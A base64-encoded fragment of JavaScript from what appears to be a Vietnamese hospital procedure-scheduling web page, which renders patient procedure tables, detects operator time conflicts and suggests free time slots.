Kz0gYA0KICAgICAgICA8dHIgY2xhc3M9ImVycm9yLXJvdyI+DQogICAgICAgICAgICA8dGQ+JHtlcnJvci5wYXRpZW50TmFtZX0gWzxmb250IGNvbG9yPSJyZWQiPiR7ZXJyb3IucGF0aWVudEFnZX08L2ZvbnQ+XTxici8+JHtlcnJvci5wYXRpZW50SWR9PC90ZD4NCiAgICAgICAgICAgIDx0ZD4ke2Vycm9yLnByb2NlZHVyZX08L3RkPg0KCQkJPHRkIGNsYXNzPSJkb2N0b3ItY29sdW1uIiBzdHlsZT0iJHtkb2N0b3JDb2x1bW5TdHlsZX0iPiR7ZXJyb3IuZG9jdG9yIHx8ICdLaMO0bmcgY8OzJ308L3RkPg0KICAgICAgICAgICAgPHRkPiR7ZXJyb3Iub3BlcmF0b3IucmVwbGFjZSgvLC9nLCAnJyl9PC90ZD4NCiAgICAgICAgICAgIDx0ZD48Y2VudGVyPiR7ZXJyb3IuZGF0ZX08YnIvPiR7ZXJyb3Iuc3RhcnRUaW1lfSDihpIgJHtlcnJvci5lbmRUaW1lfTwvY2VudGVyPjwvdGQ+DQogICAgICAgICAgICANCiAgICAgICAgPC90cj5gOw0KICAgIH0pOw0KICAgIA0KICAgIGh0bWwgKz0gYDwvdGJvZHk+PC90YWJsZT5gOw0KICAgIA0KICAgIG1pc3NpbmdNYWNoaW5lTG9nRGl2LmlubmVySFRNTCA9IGh0bWw7DQp9DQpmdW5jdGlvbiBnZW5lcmF0ZVRpbWVTdWdnZXN0aW9ucyhwcm9jZWR1cmVzKSB7DQogICAgY29uc3QgdGltZU9wdGlvbiA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJ2lucHV0W25hbWU9InRpbWVPcHRpb24iXTpjaGVja2VkJykudmFsdWU7DQogICAgY29uc3Qgc3RhcnRIb3VyID0gdGltZU9wdGlvbiA9PT0gJzc6MzAnID8gNy41IDogNzsNCiAgICBjb25zdCBpZ25vcmVBZGphY2VudCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdpZ25vcmVBZGphY2VudENoZWNrYm94JykuY2hlY2tlZDsNCiAgICBjb25zdCBidWZmZXJNaW51dGVzID0gaWdub3JlQWRqYWNlbnQgPyAwIDogMTsNCiAgICBjb25zdCBzaG93TW9yZVN1Z2dlc3Rpb25zID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Nob3dNb3JlU3VnZ2VzdGlvbnNDaGVja2JveCcpLmNoZWNrZWQ7DQogICAgDQogICAgLy8gU+G7kSBraHVuZyBnaeG7nSB04buRaSDEkWEgbeG7l2kgYnXhu5VpIChu4bq/dSBjaOG7jW4gNiBraHVuZyB0aMOsIDMgc8OhbmcgKyAzIGNoaeG7gXUpDQogICAgY29uc3QgbWF4TW9ybmluZyA9IHNob3dNb3JlU3VnZ2VzdGlvbnMgPyAzIDogMjsNCiAgICBjb25zdCBtYXhBZnRlcm5vb24gPSBzaG93TW9yZVN1Z2dlc3Rpb25zID8gMyA6IDE7DQoNCiAgICBwcm9jZWR1cmVzLmZvckVhY2gocHJvYyA9PiB7DQogICAgICAgIGlmICghcHJvYy5jb25mbGljdCkgcmV0dXJuOw0KDQogICAgICAgIGNvbnN0IHNhbWVEYXlQcm9jZWR1cmVzID0gcHJvY2VkdXJlcy5maWx0ZXIocCA9PiANCiAgICAgICAgICAgIHAuZGF0ZSA9PT0gcHJvYy5kYXRlICYmIA0KICAgICAgICAgICAgcC5vcGVyYXRvciA9PT0gcHJvYy5vcGVyYXRvciAmJg0KICAgICAgICAgICAgcC5yb3dJbmRleCAhPT0gcHJvYy5yb3dJbmRleA0KICAgICAgICApOw0KDQogICAgICAgIGNvbnN0IGR1cmF0aW9uU2Vjb25kcyA9IHByb2MuZW5kIC0gcHJvYy5zdGFydCArIChidWZmZXJNaW51dGVzICogNjApOw0KICAgICAgICANCiAgICAgICAgLy8gVMOsbSBraHVuZyBnaeG7nSBideG7lWkgc8OhbmcNCiAgICAgICAgY29uc3QgbW9ybmluZ1Nsb3RzID0gZmluZEF2YWlsYWJsZVNsb3RzKA0KICAgICAgICAgICAgc3RhcnRIb3VyICogMzYwMCwgDQogICAgICAgICAgICAxMS41ICogMzYwMCwgDQogICAgICAgICAgICBkdXJhdGlvblNlY29uZHMsIA0KICAgICAgICAgICAgc2FtZURheVByb2NlZHVyZXMsIA0KICAgICAgICAgICAgbWF4TW9ybmluZw0KICAgICAgICApOw0KICAgICAgICANCiAgICAgICAgLy8gVMOsbSBraHVuZyBnaeG7nSBideG7lWkgY2hp4buBdQ0KICAgICAgICBjb25zdCBhZnRlcm5vb25TbG90cyA9IGZpbmRBdmFpbGFibGVTbG90cygNCiAgICAgICAgICAgIDEzLjUgKiAzNjAwLCANCiAgICAgICAgICAgIDE3ICogMzYwMCwgDQogICAgICAgICAgICBkdXJhdGlvblNlY29uZHMsIA0KICAgICAgICAgICAgc2FtZURheVByb2NlZHVyZXMsIA0KICAgICAgICAgICAgbWF4QWZ0ZXJub29uDQogICAgICAgICk7DQoNCiAgICAgICAgLy8gRm9ybWF0IGvhur90IHF14bqjDQogICAgICAgIGxldCBzdWdnZXN0aW9ucyA9IFtdOw0KICAgICAgICBpZiAobW9ybmluZ1Nsb3RzLmxlbmd0aCA+IDApIHsNCiAgICAgICAgICAgIHN1Z2dlc3Rpb25zLnB1c2goJzxzdHJvbmc+U8Ohbmc6PC9zdHJvbmc+PGJyPicgKyANCiAgICAgICAgICAgICAgICBtb3JuaW5nU2xvdHMubWFwKHNsb3QgPT4gYCR7c2xvdC5zdGFydH0gLSAke3Nsb3QuZW5kfWApLmpvaW4oJzxicj4nKSk7DQogICAgICAgIH0NCiAgICAgICAgaWYgKGFmdGVybm9vblNsb3RzLmxlbmd0aCA+IDApIHsNCiAgICAgICAgICAgIHN1Z2dlc3Rpb25zLnB1c2goJzxzdHJvbmc+Q2hp4buBdTo8L3N0cm9uZz48YnI+JyArIA0KICAgICAgICAgICAgICAgIGFmdGVybm9vblNsb3RzLm1hcChzbG90ID0+IGAke3Nsb3Quc3RhcnR9IC0gJHtzbG90LmVuZH1gKS5qb2luKCc8YnI+JykpOw0KICAgICAgICB9DQoNCiAgICAgICAgDQppZiAobW9ybmluZ1Nsb3RzLmxlbmd0aCArIGFmdGVybm9vblNsb3RzLmxlbmd0aCA+IDApIHsNCiAgICBwcm9jLnN1Z2dlc3Rpb24gPSBzdWdnZXN0aW9ucy5qb2luKCc8YnI+Jyk7DQp9IGVsc2Ugew0KICAgIHByb2Muc3VnZ2VzdGlvbiA9ICc8c3BhbiBjbGFzcz0ibm8tc3VnZ2VzdGlvbiI+S2jDtG5nIGPDsyBraHVuZyBnaeG7nSB0cuG7kW5nPC9zcGFuPic7DQp9DQoNCiAgICB9KTsNCn0NCi8vIEjDoG0ga2nhu4NtIHRyYSB4dW5nIMSR4buZdCB0aOG7nWkgZ2lhbg0KZnVuY3Rpb24gaGFzVGltZUNvbmZsaWN0KHN0YXJ0VGltZSwgZHVyYXRpb24sIHByb2NlZHVyZXMpIHsNCiAgICBjb25zdCBlbmRUaW1lID0gc3RhcnRUaW1lICsgZHVyYXRpb247DQogICAgDQogICAgZm9yIChjb25zdCBwcm9jIG9mIHByb2NlZHVyZXMpIHsNCiAgICAgICAgY29uc3QgcHJvY1N0YXJ0ID0gcHJvYy5zdGFydDsNCiAgICAgICAgY29uc3QgcHJvY0VuZCA9IHByb2MuZW5kICsgKHByb2MucHJvY2VkdXJlSW5mbz8uYnVmZmVyIHx8IDApICogNjA7DQogICAgICAgIA0KICAgICAgICBpZiAoKHN0YXJ0VGltZSA+PSBwcm9jU3RhcnQgJiYgc3RhcnRUaW1lIDwgcHJvY0VuZCkgfHwgDQogICAgICAgICAgICAoZW5kVGltZSA+IHByb2NTdGFydCAmJiBlbmRUaW1lIDw9IHByb2NFbmQpIHx8DQogICAgICAgICAgICAoc3RhcnRUaW1lIDw9IHByb2NTdGFydCAmJiBlbmRUaW1lID49IHByb2NFbmQpKSB7DQogICAgICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICAgICAgfQ0KICAgIH0NCiAgICANCiAgICByZXR1cm4gZmFsc2U7DQp9DQovLyBIw6BtIHTDrG0ga2h1bmcgZ2nhu50gdHLhu5FuZw0KZnVuY3Rpb24gZmluZEF2YWlsYWJsZVNsb3RzKHN0YXJ0VGltZSwgZW5kVGltZSwgZHVyYXRpb24sIHByb2NlZHVyZXMsIG1heFNsb3RzKSB7DQogICAgY29uc3Qgc2xvdHMgPSBbXTsNCiAgICBsZXQgY3VycmVudFRpbWUgPSBzdGFydFRpbWU7DQogICAgY29uc3QgaWdub3JlQWRqYWNlbnQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnaWdub3JlQWRqYWNlbnRDaGVja2JveCcpLmNoZWNrZWQ7DQogICAgY29uc3QgYnVmZmVyTWludXRlcyA9IGlnbm9yZUFkamFjZW50ID8gMCA6IDE7DQogICAgDQogICAgd2hpbGUgKGN1cnJlbnRUaW1lICsgZHVyYXRpb24gPD0gZW5kVGltZSAmJiBzbG90cy5sZW5ndGggPCBtYXhTbG90cykgew0KICAgICAgICBpZiAoIWhhc1RpbWVDb25mbGljdChjdXJyZW50VGltZSwgZHVyYXRpb24sIHByb2NlZHVyZXMpKSB7DQogICAgICAgICAgICBzbG90cy5wdXNoKHsNCiAgICAgICAgICAgICAgICBzdGFydDogc2Vjb25kc1RvVGltZVN0cihjdXJyZW50VGltZSksDQogICAgICAgICAgICAgICAgZW5kOiBzZWNvbmRzVG9UaW1lU3RyKGN1cnJlbnRUaW1lICsgKGR1cmF0aW9uIC0gKGJ1ZmZlck1pbnV0ZXMgKiA2MCkpKSAvLyBUcuG7qyBidWZmZXIgxJHhu4MgaGnhu4NuIHRo4buLDQogICAgICAgICAgICB9KTsNCiAgICAgICAgfQ0KICAgICAgICBjdXJyZW50VGltZSArPSAxNSAqIDYwOyAvLyBLaeG7g20gdHJhIG3hu5dpIDE1IHBow7p0DQogICAgfQ0KICAgIA0KICAgIHJldHVybiBzbG90czsNCn0NCg0KICAgICAgICBmdW5jdGlvbiBzZWNvbmRzVG9UaW1lU3RyKHNlY29uZHMpIHsNCiAgICAgICAgICAgIGNvbnN0IGhvdXJzID0gTWF0aC5mbG9vcihzZWNvbmRzIC8gMzYwMCk7DQogICAgICAgICAgICBjb25zdCBtaW51dGVzID0gTWF0aC5mbG9vcigoc2Vjb25kcyAlIDM2MDApIC8gNjApOw0KICAgICAgICAgICAgcmV0dXJuIGAke2hvdXJzLnRvU3RyaW5nKCkucGFkU3RhcnQoMiwgJzAnKX06JHttaW51dGVzLnRvU3RyaW5nKCkucGFkU3RhcnQoMiwgJzAnKX1gOw0KICAgICAgICB9DQoNCg0KLy8gxJDhur9tIHThu5VuZyBjYSAic+G6r2MgdGh14buRYyIga2jDoWMgxJFhIHPhu5EgKG91dGxpZXIpDQpmdW5jdGlvbiBnZXRIZXJiT3V0bGllclRvdGFsKCkgew0KICBjb25zdCBoZXJicyA9IEFycmF5LmlzQXJyYXkod2luZG93LmFsbEhlcmJQcm9jZWR1cmVzKSA/IHdpbmRvdy5hbGxIZXJiUHJvY2VkdXJlcyA6IFtdOw0KICBjb25zdCBjb3VudHNCeURhdGUgPSB7fTsNCiAgaGVyYnMuZm9yRWFjaChoID0+IHsNCiAgICBjb25zdCBkID0gaC5kYXRlOw0KICAgIGNvbnN0IG4gPSAoaC5vcGVyYXRvciB8fCAnS2jDtG5nIGPDsycpLnRyaW0oKS50b0xvd2VyQ2FzZSgpOw0KICAgIGlmICghY291bnRzQnlEYXRlW2RdKSBjb3VudHNCeURhdGVbZF0gPSB7fTsNCiAgICBjb3VudHNCeURhdGVbZF1bbl0gPSAoY291bnRzQnlEYXRlW2RdW25dIHx8IDApICsgMTsNCiAgfSk7DQogIGxldCBvdXRsaWVycyA9IDA7DQogIE9iamVjdC52YWx1ZXMoY291bnRzQnlEYXRlKS5mb3JFYWNoKG1hcCA9PiB7DQogICAgY29uc3QgZW50cmllcyA9IE9iamVjdC5lbnRyaWVzKG1hcCkuc29ydCgoYSxiKT0+YlsxXS1hWzFdKTsNCiAgICBjb25zdCB0b3AgPSBlbnRyaWVzWzBdOyBpZiAoIXRvcCkgcmV0dXJuOw0KICAgIGNvbnN0IHRvcE5hbWUgPSB0b3BbMF07DQogICAgZW50cmllcy5mb3JFYWNoKChbbmFtZSwgY250XSkgPT4geyBpZiAobmFtZSAhPT0gdG9wTmFtZSkgb3V0bGllcnMgKz0gY250OyB9KTsNCiAgfSk7DQogIHJldHVybiBvdXRsaWVyczsNCn0NCg0KLy8gxJDhur9tIGzhu5dpIHNhaSB0aOG7nWkgZ2lhbiAoa+G6v3QgdGjDumMgPD0gYuG6r3QgxJHhuqd1LCDEkeG7i25oIGThuqFuZyBzYWksIHNhaSBwaMO6dCBzbyB24bubaSBxdXkgxJHhu4tuaCwuLi4pDQpmdW5jdGlvbiBnZXRUaW1lRXJyb3JUb3RhbCgpIHsNCiAgLy8gxJDhur9tIMSRw7puZyB0aGVvIHPhu5EgaMOgbmcgbOG7l2kgxJFhbmcgaGnhu4NuIHRo4buLDQogIGNvbnN0IGNvbnRhaW5lciA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdlcnJvckxvZycpOyAvLyB2w7luZyBi4bqjbmcgbOG7l2kgdGjhu51pIGdpYW4NCiAgaWYgKCFjb250YWluZXIpIHJldHVybiAwOw0KICByZXR1cm4gY29udGFpbmVyLnF1ZXJ5U2VsZWN0b3JBbGwoJ3RyLmVycm9yLXJvdycpLmxlbmd0aDsNCn0NCg0KZnVuY3Rpb24gZ2V0Q29uZmxpY3RUb3RhbCgpIHsNCiAgLy8gxJDhur9tIMSRw7puZyB0aGVvIHPhu5EgaMOgbmcgeHVuZyDEkeG7mXQgdHJvbmcga+G6v3QgcXXhuqMNCiAgY29uc3QgdGJvZHkgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncmVzdWx0Qm9keScpOyAvLyB0Ym9keSBj4bunYSBi4bqjbmcga+G6v3QgcXXhuqMNCiAgaWYgKCF0Ym9keSkgcmV0dXJuIDA7DQogIHJldHVybiB0Ym9keS5xdWVyeVNlbGVjdG9yQWxsKCd0ci5jb25mbGljdC1yb3cnKS5sZW5ndGg7DQp9DQoNCg0KDQoNCg0KDQoNCg0KICAgICAgIGZ1bmN0aW9uIGRpc3BsYXlSZXN1bHRzKHByb2NlZHVyZXMsIHNraXBwZWRSb3dzID0gMCkgew0KICAgIGFsbFByb2NlZHVyZXMgPSBwcm9jZWR1cmVzOw0KICAgIA0KICAgIGNvbnN0IG9wZXJhdG9ycyA9IFsuLi5uZXcgU2V0KHByb2NlZHVyZXMubWFwKHAgPT4gcC5vcGVyYXRvcikpXTsNCiAgICBjb25zdCBvcGVyYXRvclNlbGVjdCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdvcGVyYXRvclNlbGVjdCcpOw0KICAgIGNvbnN0IG9wZXJhdG9yU2VsZWN0RXJyb3IgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnb3BlcmF0b3JTZWxlY3RFcnJvcicpOw0KICAgIA0KICAgIG9wZXJhdG9yU2VsZWN0LmlubmVySFRNTCA9ICc8b3B0aW9uIHZhbHVlPSJhbGwiPlThuqV0IGPhuqM8L29wdGlvbj4nICsgDQogICAgICAgIG9wZXJhdG9ycy5tYXAob3AgPT4gYDxvcHRpb24gdmFsdWU9IiR7b3B9Ij4ke29wLnJlcGxhY2UoLywvZywgJycpfTwvb3B0aW9uPmApLmpvaW4oJycpOw0KICAgIA0KICAgIG9wZXJhdG9yU2VsZWN0RXJyb3IuaW5uZXJIVE1MID0gb3BlcmF0b3JTZWxlY3QuaW5uZXJIVE1MOyAvLyDEkOG7k25nIGLhu5kgbuG7mWkgZHVuZw0KICAgIA0KICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdvcGVyYXRvckZpbHRlcicpLnN0eWxlLmRpc3BsYXkgPSAnYmxvY2snOw0KICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdvcGVyYXRvckZpbHRlckVycm9yJykuc3R5bGUuZGlzcGxheSA9ICdibG9jayc7DQogICAgICAgICAgICANCiAgICAgICAgICAgIGNvbnN0IGNvbmZsaWN0UHJvY2VkdXJlcyA9IHByb2NlZHVyZXMuZmlsdGVyKHAgPT4gcC5jb25mbGljdCk7DQogICAgICAgICAgICBjb25zdCBjb25mbGljdENvdW50ID0gY29uZmxpY3RQcm9jZWR1cmVzLmxlbmd0aDsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgDQogICAgICAgICAgICANCiAgICAgICAgICAgIGZpbHRlckJ5T3BlcmF0b3IoKTsNCiAgICAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncmVzdWx0U2VjdGlvbicpLnN0eWxlLmRpc3BsYXkgPSAnYmxvY2snOw0KICAgIA0KICAgIC8vIE7hur91IGtow7RuZyBjw7MgbOG7l2ksIGN14buZbiB4deG7kW5nIHBo4bqnbiBr4bq/dCBxdeG6ow0KICAgIGlmIChlcnJvckxvZy5sZW5ndGggPT09IDApIHsNCiAgICAgICAgc2V0VGltZW91dCgoKSA9PiB7DQogICAgICAgICAgICBjb25zdCByZXN1bHRTZWN0aW9uID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Jlc3VsdFNlY3Rpb24nKTsNCiAgICAgICAgICAgIGlmIChyZXN1bHRTZWN0aW9uKSB7DQogICAgICAgICAgICAgICAgc21vb3RoU2Nyb2xsVG8ocmVzdWx0U2VjdGlvbiwgLTQwKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfSwgMzAwKTsNCiAgICB9DQp9DQoNCmZ1bmN0aW9uIGZpbHRlckJ5T3BlcmF0b3IoKSB7DQogICAgY29uc3Qgb3BlcmF0b3IgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnb3BlcmF0b3JTZWxlY3QnKS52YWx1ZTsNCg0KIGNvbnN0IHNob3dEb2N0b3IgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnc2hvd0RvY3RvckNoZWNrYm94JykuY2hlY2tlZDsNCiAgICBkb2N1bWVudC5ib2R5LmNsYXNzTGlzdC50b2dnbGUoJ3Nob3ctZG9jdG9yJywgc2hvd0RvY3Rvcik7DQogICAgLy8gPT09PT0gMS4gTOG7jEMgVsOAIEhJ4buCTiBUSOG7iiBC4bqiTkcgS+G6vlQgUVXhuqIgS0nhu4JNIFRSQSBYVU5HIMSQ4buYVCA9PT09PQ0KICAgIGNvbnN0IGZpbHRlcmVkUHJvY2VkdXJlcyA9IG9wZXJhdG9yID09PSAnYWxsJyANCiAgICAgICAgPyBhbGxQcm9jZWR1cmVzLmZpbHRlcihwID0+IHAuY29uZmxpY3QpIA0KICAgICAgICA6IGFsbFByb2NlZHVyZXMuZmlsdGVyKHAgPT4gcC5vcGVyYXRvci5yZXBsYWNlKC8sL2csICcnKSA9PT0gb3BlcmF0b3IucmVwbGFjZSgvLC9nLCAnJykgJiYgcC5jb25mbGljdCk7DQoNCiAgICBjb25zdCByZXN1bHRCb2R5ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Jlc3VsdEJvZHknKTsNCiAgICByZXN1bHRCb2R5LmlubmVySFRNTCA9ICcnOw0KDQogICAgLy8gTmjDs20gY8OhYyB0aOG7pyB0aHXhuq10IHh1bmcgxJHhu5l0IHbhu5tpIG5oYXUNCiAgICBjb25zdCBjb25mbGljdEdyb3VwcyA9IFtdOw0KICAgIGNvbnN0IHByb2Nlc3NlZFJvd3MgPSBuZXcgU2V0KCk7DQoNCiAgICBmaWx0ZXJlZFByb2NlZHVyZXMuZm9yRWFjaChwcm9jID0+IHsNCiAgICAgICAgaWYgKCFwcm9jZXNzZWRSb3dzLmhhcyhwcm9jLnJvd0luZGV4KSkgew0KICAgICAgICAgICAgY29uc3QgZ3JvdXAgPSBbcHJvY107DQogICAgICAgICAgICBwcm9jZXNzZWRSb3dzLmFkZChwcm9jLnJvd0luZGV4KTsNCg0KICAgICAgICAgICAgLy8gVMOsbSB0aOG7pyB0aHXhuq10IGxpw6puIHF1YW4gdHJvbmcgeHVuZyDEkeG7mXQNCiAgICAgICAgICAgIGlmIChwcm9jLmNvbmZsaWN0UmVhc29uKSB7DQogICAgICAgICAgICAgICAgY29uc3QgY29uZmxpY3RNYXRjaGVzID0gcHJvYy5jb25mbGljdFJlYXNvbi5tYXRjaCgvQuG7h25oIG5ow6JuOiAoLio/KTxicj7igKIgTmfDoHk6ICguKj8pPGJyPuKAoiBUaOG7nWkgZ2lhbjogKC4qPyktL2cpOw0KICAgICAgICAgICAgICAgIGlmIChjb25mbGljdE1hdGNoZXMpIHsNCiAgICAgICAgICAgICAgICAgICAgY29uZmxpY3RNYXRjaGVzLmZvckVhY2gobWF0Y2ggPT4gew0KICAgICAgICAgICAgICAgICAgICAgICAgY29uc3QgcGF0aWVudE5hbWUgPSBtYXRjaC5tYXRjaCgvQuG7h25oIG5ow6JuOiAoLio/KTxicj4vKVsxXTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnN0IGRhdGUgPSBtYXRjaC5tYXRjaCgvTmfDoHk6ICguKj8pPGJyPi8pWzFdOw0KICAgICAgICAgICAgICAgICAgICAgICAgY29uc3QgdGltZSA9IG1hdGNoLm1hdGNoKC9UaOG7nWkgZ2lhbjogKC4qPyktLylbMV07DQoNCiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnN0IGNvbmZsaWN0UHJvYyA9IGZpbHRlcmVkUHJvY2VkdXJlcy5maW5kKHAgPT4gDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcC5wYXRpZW50TmFtZSA9PT0gcGF0aWVudE5hbWUgJiYgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcC5kYXRlID09PSBkYXRlICYmIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHAuZGlzcGxheVN0YXJ0ID09PSB0aW1lICYmDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgIXByb2Nlc3NlZFJvd3MuaGFzKHAucm93SW5kZXgpDQogICAgICAgICAgICAgICAgICAgICAgICApOw0KDQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoY29uZmxpY3RQcm9jKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZ3JvdXAucHVzaChjb25mbGljdFByb2MpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByb2Nlc3NlZFJvd3MuYWRkKGNvbmZsaWN0UHJvYy5yb3dJbmRleCk7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIH0pOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGNvbmZsaWN0R3JvdXBzLnB1c2goZ3JvdXApOw0KICAgICAgICB9DQogICAgfSk7DQoNCiAgIC8vIEhp4buDbiB0aOG7iyBr4bq/dCBxdeG6ow0KICAgIGNvbmZsaWN0R3JvdXBzLmZvckVhY2goZ3JvdXAgPT4gew0KICAgICAgICBncm91cC5mb3JFYWNoKHByb2MgPT4gew0KICAgICAgICAgICAgY29uc3Qgcm93ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgndHInKTsNCiAgICAgICAgICAgIHJvdy5jbGFzc0xpc3QuYWRkKCJoZXJiLXJvdyIpOw0KICAgICAgICAgICAgcm93LmNsYXNzTGlzdC5hZGQoJ2NvbmZsaWN0LXJvdycpOw0KICAgICAgICAgICAgcm93LmlubmVySFRNTCA9IGANCiAgICAgICAgICAgICAgICA8dGQ+JHtwcm9jLnBhdGllbnROYW1lfSBbPGZvbnQgY29sb3I9InJlZCI+JHtwcm9jLnBhdGllbnRBZ2V9PC9mb250Pl0gPGJyLz4gJHtwcm9jLnBhdGllbnRJZH08L3RkPg0KICAgICAgICAgICAgICAgIDx0ZD4ke3Byb2MucHJvY2VkdXJlfTwvdGQ+DQogICAgICAgICAgICAgICAgPHRkPjxjZW50ZXI+JHtwcm9jLmRhdGV9PGJyLz4ke3Byb2MuZGlzcGxheVN0YXJ0fSAtICR7cHJvYy5kaXNwbGF5RW5kfTwvY2VudGVyPjwvdGQ+DQogICAgICAgICAgICAgICAgPHRkIGNsYXNzPSJkb2N0b3ItY29sdW1uIj4ke3Byb2MuZG9jdG9yfTwvdGQ+DQogICAgICAgICAgICAgICAgPHRkPiR7cHJvYy5vcGVyYXRvci5yZXBsYWNlKC8sL2csICcnKX08L3RkPg0KICAgICAgICAgICAgICAgIDx0ZCBjbGFzcz0idGltZS1zdWdnZXN0aW9uIj4ke3Byb2Muc3VnZ2VzdGlvbiB8fCAnS2jDtG5nIGPDsyB4dW5nIMSR4buZdCd9PC90ZD4NCiAgICAgICAgICAgIGA7DQogICAgICAgICAgICByZXN1bHRCb2R5LmFwcGVuZENoaWxkKHJvdyk7DQogICAgICAgIH0pOw0KDQogICAgICAgIC8vIFRow6ptIGTDsm5nIHBow6JuIGPDoWNoDQogICAgICAgIGlmIChncm91cC5sZW5ndGggPiAwKSB7DQogICAgICAgICAgICBjb25zdCBzZXBhcmF0b3IgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCd0cicpOw0KICAgICAgICAgICAgc2VwYXJhdG9yLmlubmVySFRNTCA9ICc8dGQgY29sc3Bhbj0iOCIgY2xhc3M9Imdyb3VwLXNlcGFyYXRvciI+PC90ZD4nOw0KICAgICAgICAgICAgcmVzdWx0Qm9keS5hcHBlbmRDaGlsZChzZXBhcmF0b3IpOw0KICAgICAgICB9DQogICAgfSk7DQoNCiAgICAvLyBO4bq/dSBraMO0bmcgY8OzIG5ow7NtIG7DoG8gdGjDrCB0aMOqbSBkw7JuZyBiw6FvICJLaMO0bmcgY8OzIGzhu5dpIg0KICAgIGlmIChjb25mbGljdEdyb3Vwcy5sZW5ndGggPT09IDApIHsNCiAgICAgICAgY29uc3Qgcm93ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgndHInKTsNCiAgICAgICAgcm93LmlubmVySFRNTCA9IGANCiAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIDx0ZCBjb2xzcGFuPSI1ImNsYXNzPSJoZXJiLXJvdyBjb25mbGljdC1yb3ciPktow7RuZyBjw7MgbOG7l2kgbsOgbyDEkcaw4bujYyBnaGkgbmjhuq1uPC90ZD4NCiAgICAgICAgYDsNCiAgICAgICAgcmVzdWx0Qm9keS5hcHBlbmRDaGlsZChyb3cpOw0KICAgIH0NCg0KICAgIC8vID09PT09IDIuIEzhu4xDIFbDgCBISeG7gk4gVEjhu4ogQuG6ok5HIEzhu5ZJID09PT09DQpjb25zdCBvcGVyYXRvckVycm9yID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ29wZXJhdG9yU2VsZWN0RXJyb3InKS52YWx1ZTsNCiBjb25zdCBmaWx0ZXJlZEVycm9ycyA9IG9wZXJhdG9yRXJyb3IgPT09ICdhbGwnIA0KICAgPyBlcnJvckxvZyANCiAgIDogZXJyb3JMb2cuZmlsdGVyKGVycm9yID0+DQogICAgICAgZXJyb3IuZGV0YWlscyAmJg0KICAgICAgZXJyb3IuZGV0YWlscy5vcGVyYXRvciAmJg0KICAgICAgIGVycm9yLmRldGFpbHMub3BlcmF0b3IucmVwbGFjZSgvLC9nLCAnJykgPT09IG9wZXJhdG9yRXJyb3IucmVwbGFjZSgvLC9nLCAnJykNCiAgICApOw0KDQogICAgLy8gSGnhu4NuIHRo4buLIGzhu5dpIMSRw6MgbOG7jWMNCiAgICBjb25zdCBlcnJvckxvZ0RpdiA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdlcnJvckxvZycpOw0KICAgIGlmIChmaWx0ZXJlZEVycm9ycy5sZW5ndGggPT09IDApIHsNCiAgICAgICAgZXJyb3JMb2dEaXYuaW5uZXJIVE1MID0gYDx0YWJsZSBjbGFzcz0iZXJyb3ItdGFibGUiPg0KICAgICAgICA8dGhlYWQ+DQogICAgICAgICAgICA8dHI+DQogICAgICAgICAgICAgIDx0aD48aSBjbGFzcz0iZmFzIGZhLXVzZXIgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IFTDqm4gQk48L3RoPg0KICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtcHJvY2VkdXJlcyBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gVGjhu6cgdGh14bqtdDwvdGg+DQogICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS11c2VyLW51cnNlIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBOZ8aw4budaSB0aOG7sWMgaGnhu4duPC90aD4NCiAgICAgICAgICAgIDx0aD48aSBjbGFzcz0iZmFyIGZhLWNsb2NrIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBUaOG7nWkgZ2lhbjwvdGg+DQogICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS1leGNsYW1hdGlvbi10cmlhbmdsZSBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gTOG7l2k8L3RoPg0KICAgICAgICAgICAgPC90cj4NCiAgICAgICAgPC90aGVhZD4NCiAgICAgICAgPHRib2R5PiA8dHIgY2xhc3M9ImVycm9yLXJvdyI+DQogICAgICAgICAgICAgICAgPHRkIGNvbHNwYW49IjUiIGNsYXNzPSJlcnJvci1kZXRhaWwiPktow7RuZyBjw7MgbOG7l2kgbsOgbyDEkcaw4bujYyBnaGkgbmjhuq1uPC90ZD48L3RyPjwvdGJvZHk+PC90YWJsZT5gOw0KICAgICAgICBy